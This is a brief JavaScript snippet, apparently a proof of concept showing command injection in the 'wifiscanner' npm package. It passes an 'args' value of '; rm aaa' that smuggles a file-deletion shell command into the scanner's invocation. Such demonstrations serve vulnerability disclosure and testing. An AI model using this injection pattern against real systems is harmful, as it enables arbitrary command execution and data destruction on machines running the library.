let wifiscanner = require("wifiscanner");
let options = {
  args: "; rm aaa"

}
let scanner = wifiscanner(options);
scanner.scan(function(error, networks){});
